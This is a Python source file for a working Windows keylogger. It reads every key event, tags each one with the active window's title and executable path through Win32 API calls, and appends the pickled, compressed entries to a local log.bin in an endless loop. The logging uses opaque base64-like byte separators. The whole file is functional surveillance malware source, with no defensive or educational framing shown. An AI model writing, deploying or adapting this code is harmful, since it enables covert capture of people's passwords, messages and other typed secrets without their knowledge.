import modules.keyboard as kbd
from pickle import dumps
from bz2 import compress
from os.path import exists
from ctypes import windll, create_unicode_buffer

# Constants
ENTRY_SEPARATOR = b"fHwwYjExMDF8MHhERUFEQkVFRnx8"
SESSION_SEPARATOR = b"fDVFNTUxMDd8"
FILENAME = "log.bin"


class window:
    """Class for handling window-related stuff"""

    # Get DLL
    dll = windll.user32

    def __init__(self): ...

    def title(self):
        """Retrieves title of foreground window with the help of Win32 API"""

        # Retrieve handle of active window
        window_handle = self.dll.GetForegroundWindow()

        # Create unicode buffer of appropriate length
        length = self.dll.GetWindowTextLengthW(window_handle)
        buffer = create_unicode_buffer(length + 1)

        # Flush window title text to buffer
        self.dll.GetWindowTextW(window_handle, buffer, length + 1)

        # Return buffer value, or "" if blank
        return str(buffer.value) if buffer.value else ""

    def path(self):
        """Retrieve module path of window with the help of Win32 API"""

        # Retrieve handle of foreground window
        window_handle = self.dll.GetForegroundWindow()

        # Create unicode buffer of a large length
        buffer = create_unicode_buffer(999)
        self.dll.GetWindowModuleFileNameW(window_handle, buffer, 999)

        # Return buffer value, or "" if blank
        return str(buffer.value) if buffer.value else ""


# Create file if it doesn't exists
if not exists(FILENAME):
    open(FILENAME, "wb+").close()

# Start logging
with open(FILENAME, "ab+") as file:
    # Initialize new session
    file.write(SESSION_SEPARATOR)
    while True:
        # Create dictionary object for log entry
        event = kbd.read_event()
        entry = {
            "event": repr(event)[14:][:-1],
            "title": window().title(),
            "time": event.time,
            "path": window().path(),
        }
        
        # Write to log
        file.write(compress(dumps(entry)))
        file.write(ENTRY_SEPARATOR)
